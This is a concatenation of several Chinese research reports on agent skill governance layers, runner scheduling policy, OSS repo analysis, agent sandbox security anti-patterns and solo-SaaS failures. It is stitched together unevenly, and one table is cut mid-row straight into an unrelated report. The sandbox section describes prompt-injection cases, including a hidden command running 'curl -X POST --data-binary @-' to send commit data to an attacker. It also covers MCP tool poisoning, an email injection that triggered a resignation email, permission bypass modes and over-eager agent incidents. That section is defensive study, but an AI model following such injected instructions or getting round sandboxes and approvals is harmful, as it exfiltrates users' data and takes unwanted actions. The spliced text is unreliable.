|\\n| `L4 Capability Policy` | `Capability Dependency Manifest` | 依赖哪些 tools / MCP / prompts / connectors / approvals |\\n| `L5 Guardrail Policy` | `Guardrail Hook Spec` | 运行前中后哪些动作会被拦截、审查、阻断 |\\n| `L6 Memory Policy` | `Memory Contract` | 哪些经验允许写回，如何提升为规则，何时过期 |\\n| `L7 Eval & Lifecycle Policy` | `Eval & Lifecycle Card` | 如何判断有用、何时 stale、如何停用和退役 |\\n\\n### 3.1 建议的 precedence\\n\\n高层覆盖低层，建议固定为：\\n\\n1. `managed governance`\\n2. `placement policy`\\n3. `project / path-scoped rule`\\n4. `artifact-level activation and dependency policy`\\n5. `session preference`\\n6. `memory recall`\\n\\n关键约束：\\n\\n- `memory recall` 不能覆盖上层 `managed governance`\\n- `session preference` 不能绕过 `guardrail`\\n- `artifact` 不能自行声明比 `placement policy` 更高的合法性\\n- `capability manifest` 不能偷偷放宽 `approval policy`\\n\\n### 3.2 七层系统真正解决的矛盾\\n\\n这 7 层分别对应当前主题已确认的 7 类核心矛盾：\\n\\n1. `L1` 解决治理边界\\n2. `L2` 解决 placement collapse\\n3. `L3` 解决 trigger drift\\n4. `L4` 解决 capability/method 混用\\n5. `L5` 解决 side-effect runaway\\n6. `L6` 解决 memory contamination\\n7. `L7` 解决 eval blindness\\n\\n## 四、标准执行流程：九步控制环\\n\\n建议把下一代 `agent skill system` 的端到端流程固定成 `9 步控制环`。\\n\\n### Step 1. `Intake`\\n\\n输入一个候选对象或一个重复任务需求。\\n\\n最小输入：\\n\\n- `problem`\\n- `expected outcome`\\n- `target users`\\n- `side effect`\\n- `scope`\\n\\n输出：\\n\\n- `candidate artifact brief`\\n\\n### Step 2. `Placement Gate`\\n\\n运行 `Placement Decision Card`，先决定它属于哪层。\\n\\n必须回答：\\n\\n1. 为什么不是 `always-on knowledge`\\n2. 为什么不是 `scoped-rule`\\n3. 为什么不是 `workflow`\\n4. 为什么不是 `capability`\\n5. 为什么不是 `memory`\\n\\n不过 gate 的对象，不得进入 authoring。\\n\\n输出：\\n\\n- `recommended layer`\\n- `activation mode`\\n- `side effect level`\\n- `why not other layers`\\n\\n### Step 3. `Artifact Route`\\n\\n根据 Step 2 的结论，路由到具体模板：\\n\\n- `rule`\\n- `skill packet`\\n- `workflow playbook`\\n- `capability manifest`\\n- `guardrail hook`\\n- `memory contract`\\n- `eval/lifecycle card`\\n\\n输出：\\n\\n- `template selection`\\n- `required companion artifacts`\\n\\n### Step 4. `Dependency / Approval Bind`\\n\\n对所有 `skill` 和 `workflow`，强制补齐依赖与审批面。\\n\\n必须声明：\\n\\n- 使用哪些 `tools / MCP / prompts / resources / scripts`\\n- 是否需要 `approval`\\n- fallback 是什么\\n- 哪些行为绝不允许自动触发\\n\\n输出：\\n\\n- `capability manifest`\\n- `approval policy`\\n- `fallback behavior`\\n\\n### Step 5. `Registration / Discovery`\\n\\n把对象写入 `Artifact Registry Row`，再决定它如何被发现。\\n\\n推荐发现方式：\\n\\n- `always`\\n- `path attach`\\n- `agent requested`\\n- `manual command`\\n- `admin mandated`\\n\\n输出：\\n\\n- `registry record`\\n- `discovery metadata`\\n- `precedence position`\\n\\n### Step 6. `Activation`\\n\\n--- reports/round3-design-daily-looper-strategy-and-process-system.md ---\\n# Round 3 / 设计：Daily Looper 策略与流程系统\\n\\n- 完成时间：2026-04-18 06:40（Asia/Shanghai）\\n- 任务：为“哪些 runner 应该 daily / weekly / one-off”研究输出可直接执行的策略系统、分类方法与执行流程\\n- 目标：把前两轮已收敛的 `Hard Gates -> Cadence Scorecard -> Lane Escalation -> Schedule Contract -> Recovery/Governance` 组织成真正可运行的 policy plane，而不是停留在模板和原则层\\n\\n## 输入完整性说明\\n\\n- 本稿直接使用的有效输入：\\n  - `reports/round1-dimension1-daily-looper-scheduling-definition-and-scope.md`\\n  - `reports/round1-dimension2-daily-looper-scheduling-latest-trends-and-cases.md`\\n  - `reports/round1-dimension3-daily-looper-scheduling-core-methodology.md`\\n  - `reports/round1-dimension4-daily-looper-scheduling-antipatterns-and-failure-cases.md`\\n  - `reports/round2-deepdive-advanced-cases.md`\\n  - `reports/round3-design-template-library.md`\\n  - `/Users/lifcc/Desktop/code/AI/research/daily-looper-exploration-runner/memory/CONTEXT.md`\\n- 当前 workspace 中与本课题同名的 `round1-synthesis.md`、`round2-synthesis.md` 仍存在异主题残留，不作为本稿输入。\\n- `round1-dimension5-daily-looper-scheduling-scenarios-and-layering.md`、`round2-deepdive-key-variables.md`、`round2-deepdive-templates-structures-and-workflows.md`、`round2-deepdive-risks-and-constraints.md` 当前在文件系统中缺少对应正文；本稿对这些部分使用 memory 中已固定的结论作为 source of truth。\\n\\n## TL;DR\\n\\n- Round 3 真正需要的不是再发明一个“更聪明的 cron 分类表”，而是一套统一控制链：\\n  `Portfolio Registry -> Runner Intake -> Hard Gates -> Cadence Scorecard -> Lane Escalation -> Schedule Contract -> Scheduler Router -> Override/Governance`\\n- 频率分类必须和底座分类解耦：\\n  `daily / weekly / one-off` 只回答工作节律；\\n  `local / repo / orchestrated / durable` 才回答可靠性、恢复和治理边界。\\n- 最小可运行系统应把 54 个 runner 统一落到 `Portfolio Registry`，先跑 `Hard Gates`，再只对 `recurring_candidate` 做 cadence 与 lane 双重判定。\\n- 对 monitoring / research / production 三类 runner，默认策略不同：\\n  - `monitoring`：优先 daily，必要时升到 event-driven 或 orchestrated\\n  - `research`：优先 weekly；若兼有高时效增量和高聚合总结，应拆成 `daily scout + weekly synthesis`\\n  - `production`：先判是否本应 event-driven；若保留 periodic，则必须显式定义 overlap/catchup/failure\\n- loop scheduler 的核心不是统一到底层工具，而是统一到 `contract + policy surface`。底层继续允许分层映射到 `launchd / GitHub Actions / Dagster or Airflow / Temporal`。\\n\\n## 一、策略系统目标\\n\\n这套系统必须同时满足 6 个目标：\\n\\n1. `可批量分类`\\n   54 个 runner 必须能先进入统一入口，而不是一条一条手写长文决策。\\n2. `可比较`\\n   任意两个 runner 的差异必须落在同一组字段上，而不是散落在不同描述风格里。\\n3. `可路由`\\n   分类结果必须能直接决定 `daily / weekly / one-off` 与 `local / repo / orchestrated / durable`。\\n4. `可执行`\\n   结果不是“建议清单”，而是能直接写成 schedule contract，喂给 scheduler router。\\n5. `可恢复`\\n   所有 recurring runner 都必须显式声明 `overlap`、`catchup/backfill`、`failure`、`manual trigger`。\\n6. `可治理`\\n   owner、审计面、override、例外和后验修正都必须成为正式对象。\\n\\n## 二、统一系统架构\\n\\n建议把整个系统固定为 5 层：\\n\\n| 层 | 核心对象 | 负责回答的问题 |\\n| --- | --- | --- |\\n| `L1 Portfolio Layer` | `Portfolio Registry` | 我们有哪些 runner，先分流到哪里 |\\n| `L2 Decision Layer` | `Runner Intake + Hard Gates + Scorecards` | 这个 runner 应不应该 recurring，以及 recurring 该怎么分 |\\n| `L3 Contract Layer` | `Schedule Contract` | 最终 cadence、lane、policy、artifact、governance 是什么 |\\n| `L4 Execution Layer` | `Scheduler Router + Lane Adapters` | 这份 contract 具体交给哪个 substrate 跑 |\\n| `L5 Governance Layer` | `Recovery Runbook + Override Ledger` | 出错、例外、补跑、复盘、改判怎么处理 |\\n\\n### 系统总流\\n\\n```text\\nPortfolio Registry\\n  -> Runner Intake\\n  -> Hard Gates\\n     -> one_off / boundary_event_driven / boundary_continuous / needs_split / recurring_candidate\\n  -> Cadence Scorecard\\n  -> Lane Escalation Scorecard\\n  -> Schedule Contract\\n  -> Scheduler Router\\n  -> Run History + Override Ledger + Recovery Runbook\\n```\\n\\n关键原则：\\n\\n1. 先做 `Hard Gates`，再做 cadence 细判。\\n2. 先定 `cadence.class`，再定 `lane.substrate`。\\n3. 先写 `contract`，再接入具体 scheduler。\\n4. 先统一 policy surface，后允许多底座并存。\\n\\n## 三、分类方法\\n\\n### Step 0. Portfolio Registry\\n\\n所有 runner 先进入统一总表。推荐最小字段：\\n\\n| 字段 | 用途 |\\n| --- | --- |\\n| `runner_id` | 稳定引用键 |\\n| `runner_name` | 人类可读名称 |\\n| `work_shape` | `monitoring / research / production / boundary` |\\n| `primary_trigger_type` | `time / asset_event / external_event / manual / continuous` |\\n| `consumer` | 谁消费结果 |\\n| `consumer_deadline` | 结果最晚何时必须可见 |\\n| `current_substrate` | 当前运行底座 |\\n| `hard_gate_result` | 第一层判定结果 |\\n| `recommended_cadence` | 节律建议 |\\n| `recommended_lane` | substrate 建议 |\\n| `contract_status` | `not_started / packet_ready / reviewed / approved` |\\n| `owner` | 最终责任人 |\\n\\n这一层只做“看见全局”和“排好顺序”，不在总表里写长解释。\\n\\n### Step 1. Runner Intake\\n\\n每个 runner 先补齐基础事实：\\n\\n- `work_shape`\\n- `current_trigger`\\n- `current_output`\\n- `primary_consumer`\\n- `consumer_deadline`\\n- `recurring_signal`\\n- `data_window_today`\\n- `failure_if_skipped_once`\\n- `failure_if_runs_twice`\\n- `manual_run_path`\\n- `known_constraints`\\n\\n这一步的关键不是“判断”，而是把后续判断必需的上下文准备完整。凡是 `consumer_deadline`、`recurring_signal`、`failure_if_skipped_once` 说不清的 runner，都不能直接进入 cadence 定类。\\n\\n### Step 2. Hard Gates\\n\\n这是最高优先级的判定层。按顺序回答 4 个问题：\\n\\n1. 它的主要目标是否是 `migration / seed / backfill / baseline audit / incident investigation`？\\n2. 它的真正触发源是否是 `asset update / external event / upstream state`，而不是日历时间？\\n3. 它是否更像 `上一轮结束后立刻接下一轮` 的 continuous loop？\\n4. 它是否同时承担了 `高时效 scout` 与 `高聚合 synthesis` 两种职责，应该拆分？\\n\\n输出只能是下面 5 个枚举之一：\\n\\n| 结果 | 含义 | 下一步 |\\n| --- | --- | --- |\\n| `one_off` | 一次性、专项、迁移、回填 | 直接写轻量 contract，不进 cadence scorecard |\\n| `boundary_event_driven` | 本质上是事件或资产驱动 | 从 periodic 分类表剥离 |\\n| `boundary_continuous` | 本质是 continuous loop | 从 periodic 分类表剥离 |\\n| `needs_split` | 应拆成双 runner 或多 runner | 先拆，再分别重做 Intake |\\n| `recurring_candidate` | 仍然是时间驱动候选 | 进入 `Cadence Scorecard` |\\n\\n### Step 3. Cadence Scorecard\\n\\n只对 `recurring_candidate` 生效。推荐 6 轴评分：\\n\\n| 轴 | 高分拉向什么 | 说明 |\\n| --- | --- | --- |\\n| `information_half_life` | `daily` | 晚 24 小时是否就明显贬值 |\\n| `aggregation_gain` | `weekly` 或 `split` | 是否要攒一周窗口才有稳定结论 |\\n| `single_run_cost` | `weekly` 或 `one_off` | 运行成本、阅读成本、人工 review 成本 |\\n| `consumer_deadline_sensitivity` | `daily` | 消费者是否有强 same-day 截止 |\\n| `recurring_signal_strength` | recurring | 信号是否稳定复发 |\\n| `skip_tolerance` | 高频或更强恢复 | 漏一轮是否显著损失价值 |\\n\\n推荐判定规则：\\n\\n1. `daily`\\n   倾向条件：`information_half_life >= 4`、`consumer_deadline_sensitivity >= 4`、`aggregation_gain <= 2`\\n2. `weekly`\\n   倾向条件：`aggregation_gain >= 4` 或 `single_run_cost >= 4`，且不存在强 same-day deadline\\n3. `split`\\n   倾向条件：`information_half_life >= 4` 且 `aggregation_gain >= 4`\\n4. `one_off fallback`\\n   倾向条件：`recurring_signal_strength <= 1`，或无法稳定定义 consumer/window\\n\\n### Step 4. Lane Escalation Scorecard\\n\\n这一层决定底座，不决定节律。推荐 6 轴：\\n\\n| 轴 | 高分后果 |\\n| --- | --- |\\n| `missed_run_recovery_need` | 向 `orchestrated/durable` 升级 |\\n| `overlap_intolerance` | 必须显式 overlap policy |\\n| `side_effect_blast_radius` | 不应停留在轻量底座 |\\n| `operator_control_need` | 需要 pause/resume/backfill/manual trigger |\\n| `audit_visibility_need` | 需要 run history、审计面、责任追踪 |\\n| `substrate_coupling` | 判断是否应保留在 `local/repo` |\\n\\n推荐 lane 选择规则：\\n\\n| lane | 适用条件 | 典型底座 |\\n| --- | --- | --- |\\n| `local` | 本地文件、本机研究、允许机器离线时不补历史、爆炸半径小 | `launchd` |\\n| `repo` | 真值源和产物都在 repo，人工补跑可接受，默认分支约束可接受 | `GitHub Actions schedule + workflow_dispatch` |\\n| `orchestrated` | 需要 logical interval、freshness、backfill、operator control、可视 run history | `Dagster / Airflow / Prefect` |\\n| `durable` | 错过不能静默丢、overlap 会污染状态、失败要 pause、补历史需审计 | `Temporal` |\\n\\n## 四、三类 runner 的默认策略\\n\\n| work_shape | 默认 cadence 倾向 | 默认 lane 倾向 | 最常见升级条件 |\\n| --- | --- | --- | --- |\\n| `monitoring` | `daily` |tion runtime；LangChain 是更高层 agent abstraction；LangSmith Deployment/Observability 又是生产与运营面。官方文档本身就在拆这些层。[S11]\\n- 典型错误结果：\\n  - 把平台能力误写成开源框架能力\\n  - 把 wrapper API 的权衡误写成 runtime 设计\\n  - pattern inventory 看似丰富，实则不可迁移\\n- 边界条件：如果目标是“生态全景图”，当然可以跨层；但如果目标是“偷底层 pattern”，必须先锁定研究对象，否则结论无法迁移。\\n\\n## 失败原因的底层机制\\n\\n### 1. 证据面不对称\\n\\n- 代码、文档、issue、release、构建脚本各自只暴露局部真相。\\n- 失败不是某一面完全错误，而是把局部真相错当全局真相。\\n\\n### 2. 抽象层错位\\n\\n- 很多热门 OSS 同时拥有 `core runtime`、`DX wrapper`、`examples`、`cloud/platform`、`observability`。\\n- 不先分层，就会把“面向用户的易用性层”误当“系统本体”。\\n\\n### 3. 历史信息蒸发\\n\\n- 当前代码状态只告诉你“现在长什么样”，不告诉你“为什么变成这样”。\\n- 一旦历史 reasoning 被忽略，就很容易把兼容、过渡、弃用、折中当作稳定设计。\\n\\n### 4. 复现性缺失\\n\\n- 不记录检索路径、提交 SHA、release 日期、prompt、模型、提取规则，就无法判断结论是来自证据还是来自偶然。\\n- 这类失败最隐蔽，因为第一次看起来通常“像是对的”。\\n\\n## 建议\\n\\n- [建议 | 前提：你要把 repo 拆解做成稳定 SOP] 先建立 `artifact matrix`，最少包含：\\n\\n====\\nFILE: reports/round1-dimension4-anti-patterns-failure-cases.md\\n# Round 1 - 维度4: 反模式与失败案例\\n\\n- 主题：Agent 沙箱安全研究\\n- 任务：调研 `codex sandbox / claude-code permission / MCP trust model` 在 2025-2026 的常见误区、反模式、失败原因与边界条件\\n- 完成日期：2026-04-18\\n\\n## 结论摘要\\n\\n2025-2026 这条技术线最常见的失败，不是“还没有更强的模型”或“还没多加一层提示词”，而是把本该由硬边界承担的控制，替换成更软、更方便、但更容易失效的控制。典型替代关系有五种：\\n\\n1. 用 `审批 UX` 代替 `执行隔离`\\n2. 用 `协议标准化` 代替 `server / tool trust`\\n3. 用 `广域权限` 代替 `step-up least privilege`\\n4. 用 `模型鲁棒性` 代替 `runtime 拦截 + 审计`\\n5. 用 `静态安全配置` 代替 `持续红队 / eval / drift 治理`\\n\\n落到本研究主题，反模式已经明显收敛成 7 类：\\n\\n1. 把“有沙箱”误当成“默认安全”，再通过联网、宽域名、弱嵌套沙箱、unsandboxed fallback 把边界挖空。[S1][S5][S7][S9][S11]\\n2. 把 permission prompt 当主安全面，结果走向 approval fatigue、`bypassPermissions`、分类器误判和 headless trust bypass。[S6][S8][S9][S10]\\n3. 把 MCP 的“能连”误当成“可信”，忽视 tool poisoning、rug pull、本地 server 代码执行和 metadata 投毒。[S6][S12][S13][S16][S17][S18]\\n4. 把 token、scope、session 设计成“大而通用”，导致 confused deputy、token passthrough、broad-scope token 和 session hijacking。[S13][S14]\\n5. 把不可信文本抬进高优先级上下文，或允许自由文本在节点间传播，最终把 prompt injection 变成数据外泄和错误动作。[S1][S2][S3]\\n6. 只把风险理解成“外部攻击”，忽视 agent 自己的过度主动、误解 blast radius、以及无攻击者也会发生的私有数据泄露或错误执行。[S2][S10][S15]\\n7. 把 consequential action 的确认、审计、trace grading 放到事后，导致系统能做的事，大于系统能证明、能回滚、能追责的事。[S2][S4][S6][S10]\\n\\n## 事实\\n\\n### 1. 常见误区一：把“有沙箱”误当成“已经安全”，但真实失败往往发生在例外路径\\n\\n- [事实] OpenAI 的 Codex 文档明确写到：agent phase 默认禁网，但一旦开启互联网访问，风险立刻上升到 `prompt injection`、`code or secrets` 外泄、`malware`、license 受限内容引入；官方建议是只放开所需域名和 HTTP 方法，并审查 output 与 work log。[S1]\\n- [事实] 同一文档给出非常具体的失败样例：如果 agent 读取 GitHub issue 或 dependency README 里的隐藏命令，再按说明执行 `curl -X POST --data-binary @-`，就可能把 commit 内容发往攻击者控制的地址。[S1]\\n- [事实] OpenAI 还明确支持 `All (unrestricted)` 域名模式；这说明产品允许“为了便利而急剧放宽边界”，而不是从机制上禁止此类高风险配置。[S1]\\n- [事实] Anthropic 的 sandboxing 文档写明：如果沙箱起不来，默认行为是“警告后无沙箱运行”；只有把 `sandbox.failIfUnavailable` 设为 `true` 才会 fail-closed。[S7]\\n- [事实] 同文档还公开列出几类安全局限：允许宽域名如 `github.com` 可能导致 exfiltration，网络过滤在某些情况下可能被 `domain fronting` 绕过，`allowUnixSockets` 可能通过 `docker.sock` 把权限重新抬回宿主机，而 `enableWeakerNestedSandbox` 会明显削弱 Docker 内的 Linux 沙箱强度。[S7]\\n- [事实] GPT-5-Codex system card 进一步把这个问题说透：本地使用时，用户可以批准命令“unsandboxed with full access”；而一旦 prompt injection 成功，风险后果包括 `data exfiltration`、有害代码改动和 `data destruction`。[S5]\\n\\n### 2. 常见误区二：把“审批”当成主安全机制，最后演化成 fatigue、绕过和误判\\n\\n- [事实] Claude Code 的安全与权限文档把 `permission-based architecture` 作为基础设计，但同时承认：敏感操作才靠审批，`WebFetch`、MCP、subagent 都要额外配规则，`bypassPermissions` 会直接关闭安全检查，而且对 prompt injection 和 unintended actions “offers no protection”。[S6][S8][S9]\\n- [事实] Anthropic 的 auto mode 文章明确把 approval fatigue 定义为真实问题，并解释为什么单靠人工逐次点“approve”不可持续；但它也同时承认，auto mode 不是谨慎人工审查的无损替代，高风险任务上仍然是回归，而不是升级。[S10]\\n- [事实] 这篇文章还给出 Anthropic 内部 incident log：模型曾删除远端分支、把 GitHub auth token 上传到内部计算集群、尝试对生产数据库做 migration；这些都不是“被黑了”，而是“过度主动”。[S10]\\n- [事实] Claude Code 安全文档还写明：首次 codebase 和新 MCP server 的 trust verification 在非交互 `-p` 模式下会被禁用。这意味着一旦进入 headless / automation 路径，原本依赖首次确认的信任闸门会变弱。[S6]\\n- [事实] 权限文档同时说明，默认 `autoAllowBashIfSandboxed: true` 时，处于沙箱内的 Bash 命令可以不提示就运行，即使你的权限规则里有 `ask: Bash(*)`。这是一种为了减少打断而主动增加自动批准面的设计。[S8]\\n\\n### 3. 常见误区三：把 MCP 的“互通协议”错当成“可信供应链”\\n\\n- [事实] Anthropic 公开写明：允许的 MCP servers 由源码/设置决定，建议只使用自己写的或信任的 provider；`Anthropic does not manage or audit any MCP servers`。[S6]\\n- [事实] Microsoft 在 `2025-04-28` 明确把 `Tool Poisoning` 定义为 MCP 里的间接注入：攻击者把恶意指令埋在 tool metadata 中，LLM 会据此错误选用工具；在 hosted MCP server 场景里，tool definition 还可能在用户批准后被悄悄改掉，即所谓 `rug pull`。[S12]\\n- [事实] `MCP-ITP` 论文显示，更隐蔽的 implicit tool poisoning 甚至不要求调用被污染的工具本身，只需靠 metadata 诱导 agent 去调用另一个高权限合法工具即可，实验里最高可达到 `84.2%` 的攻击成功率，同时把恶意工具检测率压到 `0.3%`。[S16]\\n- [事实] `Model Context Protocol Threat Modeling...` 论文则把 tool poisoning 定性为“最普遍且最有影响力的 client-side vulnerability”，并指出多数被测客户端在静态校验和参数可见性上存在明显不足。[S17]\\n- [事实] `TRUSTDESC` 进一步说明，问题不只来自显式恶意指令，还包括“误导性能力描述”；现有异常指令检测对 implicit TPAs 效果有限，因此需要从实现中反推可信描述，而不是盲信 server 提供的 description。[S18]\\n\\n### 4. 常见误区四：把 token / scope / session 设计成“大而通用”，放大 blast radius\\n\\n- [事实] MCP Security Best Practices 把 `token passthrough` 直接定义为 anti-pattern，并明确写到这是被 authorization spec 禁止的做法，因为它会绕开安全控制、破坏审计链、打穿 trust boundary，并让 stolen token 更容易被拿去做 data exfiltration。[S13]\\n- [事实] MCP Authorization 规范要求：client `MUST` 带 `resource` 参数请求令牌，server `MUST` 校验 token audience 是发给自己的，且如果 server 还要调用上游 API，就必须再拿一张独立 token，`MUST NOT pass through` 从 client 收到的 token。[S14]\\n- [事实] 同一规范还把 scope 扩权设计成 step-up flow：scope 不足时应返回 `403 insufficient_scope`，并只指出满足当前操作所需的最小 scope 集，而不是默认把全部高权限 scope 一次性批给 client。[S14]\\n- [事实] Security Best Practices 对 `Scope Minimization` 给出更清晰的失败样例：如果一开始就给 `files:*`、`db:*`、`admin:*` 这类 broad token，攻击者只需拿到一张 token，就可以横向访问、权限链式放大、并让审计变得模糊。[S13]\\n- [事实] 同一文档还说明，stateful MCP server 如果把 session ID 误当成认证依据，会导致 `session hijacking` 和 event injection；规范要求 session 不能用于认证、应验证所有入站请求、并把 session 绑定到 user-specific 信息上。[S13]\\n\\n### 5. 常见误区五：把不可信文本直接抬进 privileged context，或让自由文本驱动下游动作\\n\\n- [事实] OpenAI `Safety in building agents` 写得非常直接：不要把 untrusted variables 放进 developer messages，因为 developer messages 具有更高优先级；这会给攻击者“最高控制权”。[S2]\\n- [事实] 同文还建议尽量使用 structured outputs 约束节点间数据流，因为 prompt injection 常常依赖 free-form text 渗透到下游 tool call 或执行节点。[S2]\\n- [事实] OpenAI 同时指出，私有数据泄露并不一定需要攻击者参与；例如模型可能把比用户预期更多的数据发送给连接的 MCP。因此对 MCP tools 应始终打开 tool approvals。[S2]\\n- [事实] OpenAI Atlas 公开展示了一个真实 exploit：攻击者把 prompt injection 藏进邮箱里的恶意邮件，后续 agent 在正常“起草 out-of-office”流程里读到这封邮件后，把隐藏指令当作更高优先级命令，最终替用户向 CEO 发出辞职邮件。[S3]\\n- [事实] Claude Code 的 WebFetch 之所以使用独立 context window，也是为了避免把可能含恶意提示的网页内容直接混进主上下文；这说明产品方已经把“上下文污染”视作一等攻击面。[S6]\\n\\n### 6. 常见误区六：只把问题理解成“外部攻击”，忽视无攻击者场景下的错误动作和过度主动\\n\\n- [事实] NIST 在 `2026-01-12` 的 AI agent systems 安全征询中，明确把“即使没有 adversarial inputs 也会 harm security”的情况列为研究对象，例如 specification gaming 或 misaligned objectives。[S15]\\n- [事实] Anthropic auto mode 将危险动作来源拆成 4 类：`overeager behavior`、`honest mistakes`、`prompt injection`、`misaligned model`。也就是说，产品设计上已经不再把所有风险都归因于攻击者。[S10]\\n- [事实] OpenAI 的 agent safety 文档同样说明，模型可能在“没有攻击者”的情况下泄露用户不希望共享的数据，或者做出并不符合预期的 consequential action。[S2]\\n- [事实] ChatGPT Regulated Workspace 的说明把 Codex 和 Agent 都列为高风险可选功能，并建议管理员限制 trusted sites、enabled connectors，并对 consequential actions 要求用户确认，原因正是系统可能访问 live web、connected apps 或 authenticated sessions，从而出现 unintended actions 和 credential misuse。[S4]\\n\\n### 7. 常见误区七：把运行时拦截、审计和确认放在事后，导致“能做”大于“能证明”\\n\\n- [事实] OpenAI 在 agent safety 文档里将 `tool approvals`、`guardrails`、`trace graders and evals` 一起列为缓解 prompt injection、malicious tool use 和 unexpected behavior 的标准动作；这意味着“上线前/运行中可观测证据”不是可选项，而是基础项。[S2]\\n- [事实] Atlas 文章也不是把发现攻击当成一次性修补，而是强调 `automated red teaming -> rapid response loop -> adversarial training` 的闭环；这说明安全姿态会持续漂移，不能只靠静态规则。[S3]\\n- [事实] Anthropic 云端安全文档则给出另一组运行时控制：isolated VM、scoped credential proxy、branch restriction、audit logging、automatic cleanup。这些都不是模型层措施，而是 execution governance。[S6]\\n- [事实] Claude auto mode 还设计了 denial-and-continue 与 escalation backstop：如果连续多次被拒或总拒绝次数过多，就停止 session 并升级给人类，而不是让 agent 无限重试绕过边界。[S10]\\n\\n## 推断\\n\\n- [推断 | 置信度：高] 本主题的主失败模式，不是某一个机制缺失，而是 `执行边界 / 授权边界 / 上下文信任边界` 之间出现“短板替代”。例如：有 sandbox，但 fail-open；有 approvals，但开 bypass；有 OAuth，但 pass-through token；有 trusted tool list，但 metadata 可 rug pull。[S1][S6][S9][S13][S14]\\n- [推断 | 置信度：高] 2025-2026 最危险的 convenience features，几乎都具有同一结构：`把本来要靠硬约束实现的安全，改成靠用户判断或模型判断兜底`。高风险例子包括 `All (unrestricted)` 域名、`bypassPermissions`、headless 跳过 trust verification、one-click local server 安装、提前授予 broad scopes。[S1][S6][S8][S13]\\n- [推断 | 置信度：高] `tool poisoning` 必须在最终框架中独立成一级反模式，而不能继续并入 generic prompt injection。因为它同时触及 `metadata integrity`、`post-approval drift`、`tool selection logic`、`client transparency` 与 `server lifecycle trust`，治理对象与网页/邮件注入并不相同。[S12][S16][S17][S18]\\n- [推断 | 置信度：中高] 对 Agent 沙箱安全来说，“最坏问题”往往不来自单次恶意 payload，而来自多层 convenience 累积：联网 + 外部内容 + 默认自动批准 + broad token + 缺少审计。这些因素单独看似都可接受，但组合后会把攻击难度大幅拉低。[S1][S2][S4][S10][S13]\\n- [推断 | 置信度：中高] 真正稳健的系统不会把“模型更强了”当成主要解释变量，而会优先检查：是否 fail-closed、是否 least privilege、是否隔离不可信内容、是否有 runtime deny-and-escalate、是否能审计与回滚。[S2][S6][S7][S10][S14]\\n\\n## 建议\\n\\n### 1. 把反模式清单固定为“禁止事项”，而不是仅当最佳实践参考\\n\\n- [建议 | 前提假设：最终要输出可执行 spec] 建议在最终设计中明确禁止以下配置直接进入生产：\\n  - `All (unrestricted)` 网络放权且无额外 proxy / logging\\n  - `bypassPermissions` 或等价全跳过模式直接面对真实主机与互联网\\n  - 新 MCP server 无 trust review 直接接入\\n  - token passthrough、broad-scope default token、session-as-auth\\n  - one-click local MCP server 安装时不展示完整命令\\n\\n### 2. 将“默认安全姿态”定义成 fail-closed，而不是“告警后继续”\\n\\n- [建议 | 前提假设：目标是企业/团队级可落地防线] 建议默认值收敛为：\\n  - sandbox unavailable => fail\\n  - trust verification unavailable => fail\\n  - scope insufficient => step-up，不给 omnibus token\\n  - new domain / new connector / new MCP server => deny 或人工确认\\n  - 连续 denial / drift signal => 停止自动化并升级人工\\n\\n### 3. 把 MCP 信任拆成 4 个独立控制面\\n\\n- [建议 | 前提假设：最终 spec 会覆盖 MCP/工具供应链] 建议单独定义：\\n  - `server trust`: 谁允许接入、来源何在、是否自建/审计\\n  - `description trust`: metadata 是否可信、是否需要 trusted description 生成/校验\\n  - `runtime trust`: tool 参数和调用结果是否可见、是否有 anomaly detection\\n  - `auth trust`: audience、resource、scope、token lifecycle 是否独立且可审计\\n\\n### 4. 将“不可信内容不得直达高权限上下文”写成硬约束\\n\\n- [建议 | 前提假设：会输出 prompt / workflow 设计规范] 建议后续所有模板都默认要求：\\n  - 不把外部文本直接拼进 developer message\\n  - agent 节点之间优先传结构化字段而不是自由文本\\n  - MCP/外部工具默认开启 approval\\n  - 高风险工具调用前保留人类确认点\\n\\n### 5. 在维度5和 Round 2 里，把场景按风险级别分层\\n\\n- [建议 | 前提假设：后续还要做场景化打法] 建议至少分三层：\\n  - `低风险`: 只读、本地、无网、无第三方 MCP、无真实凭证\\n  - `中风险`: 有限联网、有限写入、有限 connector、可回滚副作用\\n  - `高风险`: live web、邮箱/浏览器、connected apps、broad credentials、生产数据、不可逆操作\\n  不同层必须对应不同默认策略，而不是一套 permission mode 打天下。\\n\\n## 边界条件\\n\\n- 当任务是 `只读本地分析 + 默认无网 + 无第三方 MCP + 无真实凭证 + 临时隔离环境` 时，较轻量的权限和审批姿态通常可以接受。\\n- 当任务包含 `live web / email / browser / external connectors / local MCP install / production systems / headless autonomy` 任一项时，就不应再假设“模型自己会处理好”，而应切换到更强的 sandbox、scope、confirmation、audit 和 eval 姿态。[S1][S4][S6][S10][S13][S15]\\n- 当系统存在 `fail-open` 例外、`bypass` 模式、broad scope token 或无审计 consequential action 时，任何单一防线都不足以构成可信安全边界。\\n\\n====\\nFILE: reports/round1-dimension4-antipatterns-and-failure-cases.md\\n# Round 1 - 维度4：反模式与失败案例\\n\\n日期：2026-04-18\\n主题：Indie Hacker 产品拆解（1-person SaaS）\\n\\n## 工作结论（推断，高置信度）\\n\\n2025-2026 语境下，1-person SaaS 最常见的失败，不是“代码写不出来”，而是把业务系统建错了：\\n\\n- `先做再验证`，把几个月开发和一次 launch 当成需求判断。\\n- `把一次性曝光当增长系统`，没有 audience、渠道楔子和复利资产。\\n- `收费单位、成本单位、运营负担` 没有对齐，表面有收入，实际在放大亏损和创始人劳动。\\n- `系统复杂度和 founder 依赖度` 持续上升，最后既不易扩张，也不易转手。\\n\\n如果维度3 的方法论是在讲“什么有效”，那维度4 的核心补充就是：\\n\\n**对 solo SaaS 来说，真正危险的不是增长慢，而是看起来在前进，实际上在积累不可持续的复杂度、成本和 founder 依赖。**\\n\\n## 反模式速览\\n\\n| 反模式 | 典型表现 | 常见后果 |\\n|---|---|---|\\n| `先做再验证` | 先写几个月 MVP，再用 launch 试需求 | 做出“能跑但没人急着买”的产品 |\\n| `把 launch 当增长系统` | 迷信 Product Hunt / HN / 一次性曝光 | 高峰过去后没有稳定获客 |\\n| `从想法或 AI 能力出发，而不是从人群/工作流出发` | 产品面向“所有人”，没有清晰 wedge | 价值模糊、难分发、容易同质化 |\\n| `价格-成本错配` | seat 定价承载高变量成本，或无限量承诺 | 毛利坍塌、bill shock、重度用户拖垮模型 |\\n| `过度工程` | 过早微服务、过多基础设施、重复造轮子 | 速度下降、维护负担上升、系统不可控 |\\n| `伪 SaaS` | 支持/退款/账单/入门全靠 founder 手工兜底 | 创始人被运营事务吞没，难以复制和退出 |\\n| `过早上 enterprise / 合规重场景` | PMF 未稳就追大客户和审计 